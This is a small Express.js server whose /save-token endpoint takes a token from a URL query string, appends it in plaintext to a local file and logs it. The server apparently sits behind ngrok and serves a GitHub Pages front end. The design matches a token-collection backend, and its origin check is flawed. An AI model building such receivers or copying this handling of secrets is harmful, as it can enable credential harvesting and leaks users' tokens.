const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

app.use((req, res, next) => {
  console.log('Received request:', req.method, req.url);
  next();
});
// Enable CORS for all routes
app.use((req, res, next) => {
  try {
    const allowedOrigin = 'https://valuemediartb.github.io';

    // Optional: only allow requests from your GitHub Pages
    const origin = req.headers.origin || '';
    const referer = req.headers.referer || '';

    if (
      origin && !origin.startsWith(allowedOrigin) &&
      referer && !referer.startsWith(allowedOrigin)
    ) {
      console.warn('Blocked request from disallowed origin:', origin || referer);
      return res.status(403).send('Forbidden');
    }

    if (req.method === 'OPTIONS') {
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
      res.header('Access-Control-Allow-Headers', 'ngrok-skip-browser-warning, Content-Type');
      return res.sendStatus(200);
    }
    console.log('Incoming request:', req.method, req.path);
    next();
  } catch (err) {
    console.error('Error in middleware:', err);
    res.status(500).send('Server error');
  }
});
// Serve static files (like your GitHub Pages HTML)
app.use(express.static('public'));

// Endpoint to save the token to a file
app.get('/save-token', (req, res) => {
  const token = req.query.token;
  if (token) {
    fs.appendFile('tokens.txt', `${token}\n`, (err) => {
      if (err) {
        console.error('Error saving token:', err);
        return res.status(500).send('Error saving token');
      }
      console.log('Token saved:', token);
      res.send('Token saved successfully!');
    });
  } else {
    res.status(400).send('No token provided');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});